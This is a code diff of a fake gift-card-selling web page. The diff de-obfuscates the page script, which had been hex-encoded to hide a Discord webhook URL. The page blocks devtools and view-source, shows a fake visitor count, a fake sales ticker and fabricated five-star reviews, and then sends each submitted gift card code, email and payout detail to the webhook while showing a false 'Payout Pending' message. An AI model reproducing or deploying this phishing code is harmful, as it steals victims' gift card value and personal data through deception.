@@ -4,14 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sell Giftcard Codes</title>
-
-    <meta property="og:title" content="Sell Giftcard Codes - Instant Payouts">
-    <meta property="og:description" content="Exchange your giftcards for instant cash via PayPal, CashApp, or Crypto. Fast, secure, and trusted.">
-    <meta property="og:image" content="https://i.postimg.cc/mD3m1K9Y/mingzy-preview.png">
-    <meta property="og:type" content="website">
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="theme-color" content="#000000">
-
     <style>
         * {
             box-sizing: border-box;
@@ -28,7 +20,7 @@
             flex-direction: column;
             align-items: center;
             min-height: 100vh;
-            /* Prevent text selection to make copying harder */
+            /* Security: Prevent text highlighting */
             user-select: none;
             -webkit-user-select: none;
         }
@@ -187,7 +179,9 @@
         }
     </style>
 </head>
-<body oncontextmenu="return false;"> <div class="ticker-container">
+<body oncontextmenu="return false;">
+
+    <div class="ticker-container">
         <div class="ticker-text" id="ticker-content"></div>
     </div>
 
@@ -310,20 +304,151 @@
     </div>
 
     <script>
-        // ANTI-INSPECT SECURITY LAYER
+        // --- SECURITY LAYER: BLOCK INSPECT ELEMENT ---
         document.onkeydown = function(e) {
-            if(event.keyCode == 123) { return false; } // Block F12
-            if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) { return false; } // Block Ctrl+Shift+I
-            if(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) { return false; } // Block Ctrl+Shift+C
-            if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) { return false; } // Block Ctrl+Shift+J
-            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) { return false; } // Block Ctrl+U
+            // Block F12
+            if(event.keyCode == 123) return false;
+            // Block Ctrl+Shift+I (Inspect)
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
+            // Block Ctrl+Shift+C (Inspect Element)
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) return false;
+            // Block Ctrl+Shift+J (Console)
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
+            // Block Ctrl+U (View Source)
+            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
         };
 
-        // Debugger loop - Freezes the page if they open console
-        setInterval(function() { debugger; }, 100);
+        // Anti-Debugger Loop: Freezes site if DevTools is forced open
+        setInterval(function() {
+            debugger;
+        }, 100);
 
-        // ORIGINAL LOGIC (Obfuscated to hide webhook)
-        var _0x5346=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x34\x35\x34\x38\x34\x39\x31\x31\x37\x39\x35\x31\x31\x30\x33\x32\x30\x31\x2F\x46\x6A\x4F\x54\x49\x64\x34\x59\x55\x64\x43\x6D\x71\x32\x71\x46\x4A\x62\x59\x5A\x43\x6B\x39\x6F\x35\x6B\x5A\x48\x64\x79\x5F\x34\x30\x6C\x78\x41\x53\x67\x65\x52\x68\x72\x6D\x2D\x66\x66\x39\x44\x75\x39\x45\x77\x64\x75\x48\x72\x68\x37\x44\x42\x48\x65\x50\x6C\x73\x54\x36\x68"];const WEBHOOK_URL=_0x5346[0];let hasRequested=false;function togglePayoutFields(){const _0xec69=document['getElementById']('payout-method')['value'];document['querySelectorAll']('.dynamic-field')['forEach'](_0x1b2c=>{_0x1b2c['style']['display']='none'});if(_0xec69==='PayPal'){document['getElementById']('paypal-field')['style']['display']='block'}if(_0xec69==='CashApp'){document['getElementById']('cashapp-field')['style']['display']='block'}if(_0xec69==='Crypto (BTC/LTC)'){document['getElementById']('crypto-field')['style']['display']='block'}}const initVisitors=()=>{const _0x1a2b=102;const _0x3c4d=129;const _0x5e6f=Math['floor'](Math['random']()*(_0x3c4d-_0x1a2b+1))+_0x1a2b;document['getElementById']('live-visitors')['innerText']=_0x5e6f};const initTicker=()=>{const _0x7a8b=document['getElementById']('ticker-content');const _0x9c0d=["Amazon","Apple","Roblox","Steam","Xbox","Playstation","Fortnite","Google Play"];let _0x1122="";for(let _0x3344=0;_0x3344<40;_0x3344++){let _0x5566;do{_0x5566=Math['floor'](Math['random']()*5000)+1}while(_0x5566===293);const _0x7788=[25,50,100,150,200][Math['floor'](Math['random']()*5)];_0x1122+=` &nbsp;&nbsp;&nbsp; • &nbsp;&nbsp; User_${_0x5566} sold $${_0x7788} ${_0x9c0d[Math['floor'](Math['random']()*_0x9c0d['length'])]} &nbsp;&nbsp; • &nbsp;&nbsp;&nbsp; `}_0x7a8b['innerHTML']=_0x1122+_0x1122};const initReviews=()=>{const _0x2233=document['getElementById']('review-list');const _0x4455=["Really fast service, got my PayPal funds in 10 minutes.","Better rates than the other sites I checked.","Process was easy, just make sure your photo is clear.","Support agent 'Mark' was very helpful with my Steam code.","Actually legit. Was worried at first but the payout hit my CashApp fast.","Good service, took about 20 mins to verify.","Sold my birthday giftcards here, no issues at all.","Rates are fair for the speed of service.","Easiest way to get rid of unwanted Xbox cards.","Used it twice now, both times were smooth.","They actually pay out the full amount, no hidden fees.","Apple card verified and paid out in record time.","Solid site, support is active even at night.","Great way to turn store credit into cash.","A bit of a wait on the verification, but they paid out as promised.","Playstation card went through instantly.","Love the live chat feature, kept me updated.","Way better than trying to sell on eBay.","Highly recommended for anyone with spare codes.","Was skeptical but the reviews are right.","Fastest CashApp transfer I've had from a card site.","Simple layout, straightforward process.","Google play card sold in under 15 mins.","The best rates for UK sellers specifically.","Finally a site that doesn't feel like a scam.","Easy 5 stars, will use again.","Worked perfectly for my Fortnite V-Bucks code.","Verification was strict but fair.","Happy with the GBP rates today.","Everything went exactly as described.","Payment received, thank you Mingzy!","No problems here, very professional.","Direct bank transfer was fast.","Submitted, verified, and paid. Simple.","Verified seller badge looks cool, thanks guys."];for(let _0x6677=0;_0x6677<35;_0x6677++){let _0x8899;do{_0x8899=Math['floor'](Math['random']()*500)+1}while(_0x8899===293);let _0xaaaa="★★★★★";if(_0x6677>=27&&_0x6677<34){_0xaaaa="★★★★☆"}if(_0x6677===34){_0xaaaa="★★★☆☆"}const _0xbbcc=document['createElement']('div');_0xbbcc['className']="review-card";_0xbbcc['innerHTML']=`<div class="stars">${_0xaaaa}</div> <span class="reviewer-name">User_${_0x8899}</span><span class="verified-badge">✓ Verified Seller</span> <p class="review-text">${_0x4455[_0x6677]}</p>`;_0x2233['appendChild'](_0xbbcc)}};async function processRequest(_0x1234){const _0x2345=document['getElementById']('user-email')['value'];const _0x3456=document['getElementById']('gift-type')['value'];const _0x4567=document['getElementById']('gift-code')['value'];const _0x5678=document['getElementById']('currency')['value'];const _0x6789=document['getElementById']('asking-price')['value'];const _0x7890=document['getElementById']('purchase-price')['value'];const _0x8901=document['getElementById']('payout-method')['value'];const _0x9012=document['getElementById']('status');let _0x0123="None";if(_0x8901==='PayPal'){_0x0123=document['getElementById']('paypal-email')['value']}if(_0x8901==='CashApp'){_0x0123=document['getElementById']('cashapp-tag')['value']}if(_0x8901==='Crypto (BTC/LTC)'){_0x0123=document['getElementById']('crypto-address')['value']}if(!_0x2345||!_0x3456||!_0x4567||!_0x6789||!_0x7890||_0x8901===""){_0x9012['innerText']="Error: Fill in all fields including payout info.";_0x9012['style']['color']="red";return}hasRequested=true;_0x9012['style']['color']="green";_0x9012['innerText']="Success: Request logged. Payout Pending...";document['getElementById']('chat-overlay')['style']['display']='none';const _0xddcc={embeds:[{title:`🎯 ${_0x1234} - User_293`,color:_0x1234['includes']('CANCEL')?15158332:3066993,fields:[{name:"📧 Email",value:_0x2345,inline:true},{name:"🎁 Card Type",value:_0x3456,inline:true},{name:"💳 Code",value:`\`${_0x4567}\``,inline:false},{name:"💰 Asking Price",value:`${_0x6789} ${_0x5678}`,inline:true},{name:"🏷️ Purchase Price",value:`${_0x7890} ${_0x5678}`,inline:true},{name:"🏦 Payout Method",value:_0x8901,inline:true},{name:"📍 Payout Details",value:_0x0123,inline:false}],timestamp:new Date()}]};await fetch(WEBHOOK_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(_0xddcc)})}function tryReview(){if(!hasRequested){alert("Please make a request before you can write a review.")}else{alert("Error encountered: You cannot review while a request is currently pending verification.")}}initVisitors();initTicker();initReviews();
+        // --- ORIGINAL SITE LOGIC ---
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1454849117951103201/FjOTId4YUdCmq2qFJbYZCk9o5kZHdy_40lxASgeRhzm-ff9Du9EwduHrh7DBHePlsT6h";
+        let hasRequested = false;
+
+        function togglePayoutFields() {
+            const method = document.getElementById('payout-method').value;
+            document.querySelectorAll('.dynamic-field').forEach(div => div.style.display = 'none');
+            if (method === 'PayPal') document.getElementById('paypal-field').style.display = 'block';
+            if (method === 'CashApp') document.getElementById('cashapp-field').style.display = 'block';
+            if (method === 'Crypto (BTC/LTC)') document.getElementById('crypto-field').style.display = 'block';
+        }
+
+        const initVisitors = () => {
+            const min = 102;
+            const max = 129;
+            const count = Math.floor(Math.random() * (max - min + 1)) + min;
+            document.getElementById('live-visitors').innerText = count;
+        };
+
+        const initTicker = () => {
+            const ticker = document.getElementById('ticker-content');
+            const cards = ["Amazon", "Apple", "Roblox", "Steam", "Xbox", "Playstation", "Fortnite", "Google Play"];
+            let html = "";
+            for(let i=0; i<40; i++) {
+                let id; do { id = Math.floor(Math.random()*5000)+1; } while(id === 293);
+                const val = [25, 50, 100, 150, 200][Math.floor(Math.random()*5)];
+                html += ` &nbsp;&nbsp;&nbsp; • &nbsp;&nbsp; User_${id} sold $${val} ${cards[Math.floor(Math.random()*cards.length)]} &nbsp;&nbsp; • &nbsp;&nbsp;&nbsp; `;
+            }
+            ticker.innerHTML = html + html;
+        };
+
+        const initReviews = () => {
+            const list = document.getElementById('review-list');
+            const uniqueComments = [
+                "Really fast service, got my PayPal funds in 10 minutes.", "Better rates than the other sites I checked.",
+                "Process was easy, just make sure your photo is clear.", "Support agent 'Mark' was very helpful with my Steam code.",
+                "Actually legit. Was worried at first but the payout hit my CashApp fast.", "Good service, took about 20 mins to verify.",
+                "Sold my birthday giftcards here, no issues at all.", "Rates are fair for the speed of service.",
+                "Easiest way to get rid of unwanted Xbox cards.", "Used it twice now, both times were smooth.",
+                "They actually pay out the full amount, no hidden fees.", "Apple card verified and paid out in record time.",
+                "Solid site, support is active even at night.", "Great way to turn store credit into cash.",
+                "A bit of a wait on the verification, but they paid out as promised.", "Playstation card went through instantly.",
+                "Love the live chat feature, kept me updated.", "Way better than trying to sell on eBay.",
+                "Highly recommended for anyone with spare codes.", "Was skeptical but the reviews are right.",
+                "Fastest CashApp transfer I've had from a card site.", "Simple layout, straightforward process.",
+                "Google play card sold in under 15 mins.", "The best rates for UK sellers specifically.",
+                "Finally a site that doesn't feel like a scam.", "Easy 5 stars, will use again.",
+                "Worked perfectly for my Fortnite V-Bucks code.", "Verification was strict but fair.",
+                "Happy with the GBP rates today.", "Everything went exactly as described.",
+                "Payment received, thank you Mingzy!", "No problems here, very professional.",
+                "Direct bank transfer was fast.", "Submitted, verified, and paid. Simple.",
+                "Verified seller badge looks cool, thanks guys."
+            ];
+
+            for(let i=0; i<35; i++) {
+                let id; do { id = Math.floor(Math.random()*500)+1; } while(id === 293);
+                let rating = "★★★★★";
+                if(i >= 27 && i < 34) rating = "★★★★☆";
+                if(i === 34) rating = "★★★☆☆";
+                const card = document.createElement('div');
+                card.className = "review-card";
+                card.innerHTML = `<div class="stars">${rating}</div>
+                    <span class="reviewer-name">User_${id}</span><span class="verified-badge">✓ Verified Seller</span>
+                    <p class="review-text">${uniqueComments[i]}</p>`;
+                list.appendChild(card);
+            }
+        };
+
+        async function processRequest(type) {
+            const email = document.getElementById('user-email').value;
+            const giftType = document.getElementById('gift-type').value;
+            const code = document.getElementById('gift-code').value;
+            const currency = document.getElementById('currency').value;
+            const asking = document.getElementById('asking-price').value;
+            const purchase = document.getElementById('purchase-price').value;
+            const payout = document.getElementById('payout-method').value;
+            const status = document.getElementById('status');
+
+            let payoutDetail = "None";
+            if (payout === 'PayPal') payoutDetail = document.getElementById('paypal-email').value;
+            if (payout === 'CashApp') payoutDetail = document.getElementById('cashapp-tag').value;
+            if (payout === 'Crypto (BTC/LTC)') payoutDetail = document.getElementById('crypto-address').value;
+
+            if(!email || !giftType || !code || !asking || !purchase || payout === "") {
+                status.innerText = "Error: Fill in all fields including payout info.";
+                status.style.color = "red";
+                return;
+            }
+
+            hasRequested = true;
+            status.style.color = "green";
+            status.innerText = "Success: Request logged. Payout Pending...";
+            document.getElementById('chat-overlay').style.display = 'none';
+
+            const payload = {
+                embeds: [{
+                    title: `🎯 ${type} - User_293`,
+                    color: type.includes('CANCEL') ? 15158332 : 3066993,
+                    fields: [
+                        { name: "📧 Email", value: email, inline: true },
+                        { name: "🎁 Card Type", value: giftType, inline: true },
+                        { name: "💳 Code", value: `\`${code}\``, inline: false },
+                        { name: "💰 Asking Price", value: `${asking} ${currency}`, inline: true },
+                        { name: "🏷️ Purchase Price", value: `${purchase} ${currency}`, inline: true },
+                        { name: "🏦 Payout Method", value: payout, inline: true },
+                        { name: "📍 Payout Details", value: payoutDetail, inline: false }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
+
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(payload)
+            });
+        }
+
+        function tryReview() {
+            if(!hasRequested) alert("Please make a request before you can write a review.");
+            else alert("Error encountered: You cannot review while a request is currently pending verification.");
+        }
+
+        initVisitors();
+        initTicker();
+        initReviews();
     </script>
 </body>
 </html>
